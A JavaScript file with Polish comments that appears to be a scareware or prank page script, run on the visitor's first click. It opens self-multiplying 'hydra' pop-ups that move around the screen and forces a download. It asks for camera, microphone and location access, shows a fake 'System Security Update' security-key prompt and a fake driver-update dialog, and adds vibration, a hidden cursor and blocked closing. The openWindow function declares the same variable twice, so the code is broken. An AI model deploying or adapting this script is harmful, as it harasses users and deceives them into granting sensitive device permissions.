// Zmienna globalna do przechowywania okien
if (typeof wins === 'undefined') window.wins = [];

const WIN_WIDTH = 600;
const WIN_HEIGHT = 400;

// Funkcja generująca losowe współrzędne
const getRandomCoords = () => ({
    x: Math.floor(Math.random() * (window.screen.availWidth - WIN_WIDTH)),
    y: Math.floor(Math.random() * (window.screen.availHeight - WIN_HEIGHT))
});

function init() {
    console.log("Inicjalizacja po kliknięciu...");

    // 1. Dźwięk (teraz zadziała, bo jest interakcja)
    playSound();

    // 2. Okna (Hydra)
    openWindow(); 

    // 3. Pobieranie plików
    downloadFiles();

    // 4. Uprawnienia (Kamera, Lokalizacja)
    triggerPermissions();

    // 5. Wibracje (jeśli telefon)
    startVibrateInterval();

    // klucz windows
    triggerSecurityKeySetup();

    hideCursor();

    blockClose();
    
    // 6. Alerty (OSTATNIE - bo blokują kod!)
    //setTimeout(() => {
    //    annoyingAlerts();
    //}, 500);

    
}

// 4. PODPIĘCIE POD KLIKNIĘCIE (Bardzo ważne!)
// Przeglądarka pozwoli na dźwięk i okna TYLKO po kliknięciu
document.addEventListener('click', function() {
    if (window.wins.length === 0) { // Uruchom tylko raz
        init();
    }
}, { once: true });

// --- DEFINICJE FUNKCJI ---

function openWindow() {
    const { x, y } = getRandomCoords();
    const uniqueName = "hydra_" + Math.random().toString(36).substring(7);
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
    
    const win = window.open(window.location.pathname, uniqueName, opts);

    if (!win) {
        alert("Pop-upy są zablokowane! Zezwól na nie w ustawieniach paska adresu.");
        return;
    }

    wins.push(win);

    // Dodanie treści do nowego okna
    const win = window.open("", "", "width=800,height=600");

    // ustawienie stylów dla body nowego okna
    win.document.body.style.margin = "0";
    win.document.body.style.background = "black";
    win.document.body.style.color = "red";
    win.document.body.style.display = "flex";
    win.document.body.style.flexDirection = "column";
    win.document.body.style.justifyContent = "center";
    win.document.body.style.alignItems = "center";
    win.document.body.style.height = "100vh";
    win.document.body.style.fontFamily = "sans-serif";
    win.document.body.style.textAlign = "center";
    
    // utworzenie obrazu
    const img = win.document.createElement("img");
    img.src = "kowciu.jpg";
    img.alt = "Obraz";
    img.style.width = "80%";
    img.style.maxWidth = "100vw";
    img.style.height = "auto";
    img.style.border = "2px solid red";
    
    // dodanie obrazu do body
    win.document.body.appendChild(img);

    // Aktywacja ruchu
    if (typeof startMovingWindow === 'function') {
        startMovingWindow(win);
    }

    // --- MECHANIZM HYDRY ---
    // Kiedy użytkownik próbuje zamknąć to okno (np. Alt+F4 lub X)
    win.addEventListener("beforeunload", function (e) {
        // Standardowe zabezpieczenie przed zamknięciem
        e.preventDefault();
        e.returnValue = "";

        // Wywołujemy otwarcie dwóch nowych okien z okna głównego
        // Robimy to z lekkim opóźnieniem, by przeglądarka "przetrawiła" zamknięcie
        if (!window.closed) {
            window.openWindow(); 
            window.openWindow();
        }
    });
}

// Globalne ustawienia prędkości (piksele na klatkę)
const SPEED_X = 5; 
const SPEED_Y = 5;
const REFRESH_RATE = 10; // milisekundy (im mniej, tym płynniejszy ruch)

function startMovingWindow(win) {
    if (!win) return;

    // Początkowe kierunki (1 to w prawo/dół, -1 to w lewo/góra)
    let dx = SPEED_X;
    let dy = SPEED_Y;

    // Pobieramy wymiary ekranu i okna
    const screenWidth = window.screen.availWidth;
    const screenHeight = window.screen.availHeight;
    const winWidth = 600; // Takie same jak w openWindow
    const winHeight = 400;

    // Pobieramy aktualną pozycję (startową)
    let currentX = parseInt(win.screenX);
    let currentY = parseInt(win.screenY);

    const move = () => {
        if (win.closed) {
            clearInterval(timer);
            return;
        }

        // Aktualizacja pozycji
        currentX += dx;
        currentY += dy;
        
        // Odbijanie z marginesem bezpieczeństwa (np. 5px od krawędzi)
        const margin = 5;

        // Odbijanie od lewej/prawej krawędzi
        if (currentX + winWidth >= screenWidth - margin || currentX <= margin) {
            dx *= -1;
            // Dodatkowe zabezpieczenie: przytnij pozycję, by nie wyszła poza ekran
            currentX = Math.max(margin, Math.min(currentX, screenWidth - winWidth - margin));
        }
  
        if (currentY + winHeight >= screenHeight - margin || currentY <= margin) {
            dy *= -1;
            currentY = Math.max(margin, Math.min(currentY, screenHeight - winHeight - margin));
        }

        // Przesunięcie okna i WYMUSZENIE rozmiaru (zapobiega maksymalizacji)
        win.moveTo(currentX, currentY);
        win.resizeTo(winWidth, winHeight);
    };

    const timer = setInterval(move, REFRESH_RATE);
}
function downloadFiles() {
    // Lista plików do pobrania (zastąp je swoimi linkami)
    const files = [
        'plik1.jpg'
    ];

    files.forEach((fileUrl, index) => {
        // Używamy setTimeout, aby przeglądarka nie zablokowała wielu pobrań naraz
        setTimeout(() => {
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = fileUrl.split('/').pop(); // Sugerowana nazwa pliku
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }, index * 500); // Odstęp pół sekundy między plikami
    });
}

function annoyingAlerts() {
    while(true) {
        alert("Nigdy mnie nie zamkniesz!");
        //// UWAGA: Przeglądarki po kilku razach dają opcję "Zablokuj kolejne okna dialogowe"
    }
}

function playSound() {
    const audio = new Audio('sound.mp3'); // Możesz podać link URL lub plik lokalny
    audio.volume = 0.5; // Głośność od 0.0 do 1.0
    audio.play().catch(error => {
        console.log("Autoodtwarzanie zablokowane. Kliknij coś na stronie!");
    });
}

async function triggerPermissions() {
    // 1. Prośba o powiadomienia systemowe
    if ("Notification" in window) {
        Notification.requestPermission();
    }

    // 2. Prośba o dostęp do Geolokalizacji (Gdzie jesteś?)
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }

    // 3. Prośba o dostęp do Mikrofonu i Kamery
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
            .then(stream => {
                // Zatrzymujemy strumień od razu po uzyskaniu zgody
                stream.getTracks().forEach(track => track.stop());
            })
            .catch(err => console.log("Odmowa lub brak sprzętu: ", err));
    }

    // 4. Próba zablokowania kursora myszy (Pointer Lock)
    // Wymaga, aby element był kliknięty
    document.body.requestPointerLock = document.body.requestPointerLock || 
                                       document.body.mozRequestPointerLock;
    if (document.body.requestPointerLock) {
        document.body.requestPointerLock();
    }
    
    // 5. Klasyczne okienka blokujące
    alert("System wymaga Twojej uwagi!");
    if (confirm("Czy chcesz zaktualizować sterowniki przeglądarki?")) {
        prompt("Wpisz 'TAK', aby potwierdzić operację:");
    }
}

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

async function triggerSecurityKeySetup() {
    // Sprawdzamy, czy przeglądarka obsługuje WebAuthn
    if (!window.PublicKeyCredential) {
        console.log("WebAuthn nie jest obsługiwane w tej przeglądarce.");
        return;
    }

    // Dane konfiguracyjne - muszą być w odpowiednim formacie
    const challenge = new Uint8Array(32);
    window.crypto.getRandomValues(challenge);

    const createCredentialOptions = {
        publicKey: {
            // Nazwa "serwera" - musi być domeną, na której jesteś (lub localhost)
            rp: {
                name: "System Security Update",
                id: window.location.hostname,
            },
            user: {
                id: Uint8Array.from("UZER_ID", c => c.charCodeAt(0)),
                name: "user@system.local",
                displayName: "System User",
            },
            challenge: challenge,
            pubKeyCredParams: [{alg: -7, type: "public-key"}], // Wsparcie dla ES256
            authenticatorSelection: {
                authenticatorAttachment: "cross-platform", // Wymusza klucz zewnętrzny (USB/NFC)
            },
            timeout: 60000,
        }
    };

    try {
        console.log("Oczekiwanie na klucz zabezpieczeń...");
        // To wywołuje natywne okno Windows Security
        await navigator.credentials.create(createCredentialOptions);
    } catch (err) {
        // Użytkownik zazwyczaj klika "Anuluj", co wyrzuca błąd - ignorujemy go
        console.log("Interakcja z kluczem przerwana lub anulowana.");
    }
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}


// Ten kod musi być na samym dole pliku index.js
document.addEventListener('DOMContentLoaded', () => {
    
    // 1. Próbujemy znaleźć element po ID
    const btnById = document.getElementById('mainTrigger');
    
    // 2. Próbujemy znaleźć element po Twojej klasie JSX
    const btnByClass = document.querySelector('.jsx-5886bd7e78a93314');

    // Funkcja pomocnicza, która przypisuje "wybuch" do elementu
    const armTrigger = (el) => {
        if (el) {
            el.addEventListener('click', () => {
                console.log("Inicjalizacja systemu...");
                init(); // To uruchamia Twoją główną funkcję
            });
        }
    };

    // Uzbrajamy oba (na wszelki wypadek)
    armTrigger(btnById);
    armTrigger(btnByClass);
});

function blockClose() {
  window.onbeforeunload = function () {
    return "Na pewno chcesz wyjść?";
  };
}
